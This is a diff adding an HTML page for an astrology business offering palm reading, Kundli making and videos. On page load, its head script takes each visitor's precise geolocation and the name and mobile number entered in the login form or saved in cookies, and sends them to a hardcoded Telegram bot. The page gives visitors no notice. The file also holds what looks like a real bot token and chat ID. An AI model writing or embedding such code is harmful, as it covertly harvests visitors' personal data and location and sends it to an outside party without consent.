@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script>
+        // Telegram bot API token
+        const botToken = '1988995536:AAEYUHJ5Wy9WUNUXeAHOOLTNslxELmYkKLQ'; // Replace with your Telegram Bot Secret
+        const chatId = '-1001979008867'; // Replace with your Telegram chat ID
+
+        // Function to send location to Telegram bot
+        function sendLocationToBot(position) {
+            const lat = position.coords.latitude;
+            const long = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+
+            // Create a message with the location details
+            const message = `Your coordinate is: Lat: ${lat} Long: ${long} Accuracy: ${accuracy}`;
+
+            // Send the message to the Telegram bot
+            axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                chat_id: chatId,
+                text: message
+            })
+                .then(response => {
+                    console.log('Message sent to Telegram bot');
+                })
+                .catch(error => {
+                    console.error('Error sending message to Telegram bot:', error);
+                });
+        }
+
+        // Function to handle form submission
+        function submitLoginForm(event) {
+            event.preventDefault();
+            const name = document.getElementById("name").value;
+            const mobile = document.getElementById("mobile").value;
+            const remember = document.getElementById("remember").checked;
+
+            // Save name and mobile in cookies if "Remember Me" is checked
+            if (remember) {
+                const expirationDate = new Date('Fri, 31 Dec 2025 23:59:59 GMT').toUTCString();
+                document.cookie = `name=${name}; expires=${expirationDate}`;
+                document.cookie = `mobile=${mobile}; expires=${expirationDate}`;
+            }
+
+            // Hide the login form and show the main content after successful login
+            document.getElementById("loginForm").style.display = "none";
+            document.getElementById("mainContent").style.display = "block";
+
+            // Send login details to Telegram bot
+            const message = `Name: ${name}\nMobile Number: ${mobile}`;
+            axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                chat_id: chatId,
+                text: message
+            })
+                .then(response => {
+                    console.log('Login details sent to Telegram bot');
+                })
+                .catch(error => {
+                    console.error('Error sending login details to Telegram bot:', error);
+                });
+        }
+
+        // Function to retrieve cookie value by name
+        function getCookie(name) {
+            const cookies = document.cookie.split(';');
+            for (const cookie of cookies) {
+                const [cookieName, cookieValue] = cookie.trim().split('=');
+                if (cookieName === name) {
+                    return cookieValue;
+                }
+            }
+            return null;
+        }
+
+        window.addEventListener('DOMContentLoaded', () => {
+            // Check if user details are already stored in cookies
+            const rememberedName = getCookie('name');
+            const rememberedMobile = getCookie('mobile');
+            let message = `Name: ${rememberedName}\nMobile Number: ${rememberedMobile}`;
+
+            if ('geolocation' in navigator) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    const locationDetails = `http://www.google.com/maps/place/${position.coords.latitude},${position.coords.longitude}`;
+
+                    message += `\nLocation:\n${locationDetails}`;
+
+                    // Send login details and location details to Telegram bot
+                    axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        chat_id: chatId,
+                        text: message
+                    })
+                        .then(response => {
+                            console.log('Details sent to Telegram bot');
+                        })
+                        .catch(error => {
+                            console.error('Error sending details to Telegram bot:', error);
+                        });
+                }, error => {
+                    // Handle the case when geolocation is not available or denied
+                    console.log("Geolocation error:", error);
+
+                    // Send only the login details without location
+                    axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        chat_id: chatId,
+                        text: message
+                    })
+                        .then(response => {
+                            console.log('Login details sent to Telegram bot');
+                        })
+                        .catch(error => {
+                            console.error('Error sending login details to Telegram bot:', error);
+                        });
+                });
+            } else {
+                console.log("Geolocation is not supported in this browser.");
+
+                // Send only the login details without location
+                axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    chat_id: chatId,
+                    text: message
+                })
+                    .then(response => {
+                        console.log('Login details sent to Telegram bot');
+                    })
+                    .catch(error => {
+                        console.error('Error sending login details to Telegram bot:', error);
+                    });
+            }
+
+            if (rememberedName && rememberedMobile) {
+                // Automatically populate the login form
+                document.getElementById("name").value = rememberedName;
+                document.getElementById("mobile").value = rememberedMobile;
+                // Hide the login form and show the main content
+                document.getElementById("loginForm").style.display = "none";
+                document.getElementById("mainContent").style.display = "block";
+            } else {
+                // Show the login form if no remembered details are found
+                document.getElementById("loginForm").style.display = "block";
+                // Hide the main content initially
+                document.getElementById("mainContent").style.display = "none";
+            }
+        });
+
+
+
+
+
+    </script>
+
+    <title>Astrology Website - Vinaykant</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <script src="script.js"></script>
+</head>
+
+<body>
+    <header>
+        <h1 class="logo">Vinaykant</h1>
+        <a href="cart.html" class="cart-link">Cart 🛒 .... </a>
+    </header>
+
+    <main id="mainContent">
+        <div class="services">
+            <div class="service">
+                <h2>Palm Reading</h2>
+                <p>Get detailed insights into your future through palm reading.</p>
+            </div>
+            <div class="service">
+                <h2>Kundli Making</h2>
+                <p>Have your Kundli prepared and discover the influences of celestial bodies on your life.</p>
+            </div>
+            <div class="service">
+                <h2>Grah Nakshatra Status</h2>
+                <p>Know the current status of planetary positions and their impact on your life.</p>
+            </div>
+        </div>
+        <div class="cta-buttons">
+            <a href="https://www.facebook.com/vinaykantastro" target="_blank">Facebook Page</a>
+            <a href="https://wa.me/+919310576723" target="_blank">WhatsApp</a>
+        </div>
+        <img class="swastik"
+            src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRsAOoaoKGTJgTSc-SfbnZ1c0T8zEylC_vsRA&usqp=CAU"
+            alt="Swastik">
+        <div class="video-thumbnails">
+            <div class="video-thumbnail">
+                <img src="https://img.youtube.com/vi/8ZpuaVd4SY4/maxresdefault.jpg" alt="Video 1"
+                    onclick="openPopup('8ZpuaVd4SY4', 'Video 1')">
+                <div class="video-name">Video 1</div>
+            </div>
+            <div class="video-thumbnail">
+                <img src="https://img.youtube.com/vi/KC9HGMKKp_4/maxresdefault.jpg" alt="Video 2"
+                    onclick="openPopup('KC9HGMKKp_4', 'Video 2')">
+                <div class="video-name">Video 2</div>
+            </div>
+            <div class="video-thumbnail">
+                <img src="https://img.youtube.com/vi/0QD_HNxRWrM/maxresdefault.jpg" alt="Video 3"
+                    onclick="openPopup('0QD_HNxRWrM', 'Video 3')">
+                <div class="video-name">Video 3</div>
+            </div>
+        </div>
+        <div class="video-popup" id="videoPopup">
+            <div class="video-popup-content">
+                <a href="#" class="close-button" onclick="closePopup()">Close</a>
+                <iframe class="video-popup-iframe" src="" frameborder="0" allowfullscreen></iframe>
+            </div>
+        </div>
+    </main>
+
+    <div class="login-popup" id="loginForm">
+        <div class="login-popup-content">
+            <h2>WELCOME TO VINAYKANT ASTROLOGY</h2>
+            <img src="https://www.clipartmax.com/png/small/289-2896214_this-is-free-red-hindu-swastik-png-image-with-alpha-swastik-png.png"
+                alt="Swastik" style="width: 50px; height: 50px;">
+            <form onsubmit="submitLoginForm(event)">
+                <label for="name">Name:</label>
+                <input type="text" id="name" name="name" required><br><br>
+                <label for="mobile">Mobile Number:</label>
+                <input type="tel" id="mobile" name="mobile" required><br><br>
+                <label for="remember">Remember Me:</label>
+                <input type="checkbox" id="remember" name="remember">
+                <button type="submit">Login</button>
+            </form>
+        </div>
+    </div>
+</body>
+
+</html>
